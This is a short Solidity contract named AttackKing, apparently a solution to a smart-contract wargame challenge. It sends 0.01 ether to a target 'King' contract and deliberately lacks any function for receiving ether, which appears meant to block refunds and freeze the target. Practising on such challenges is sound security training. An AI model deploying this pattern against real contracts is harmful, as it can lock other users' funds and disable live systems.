//SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;



contract AttackKing {

    function getString() public returns(string memory){
        return "Hello This is a empty Contract";
    }

    function calltheKingFunction(address contract_add) external payable {
        (bool s,) = contract_add.call{value: 0.01 ether}("");
        require(s, "failed");
    }
    
}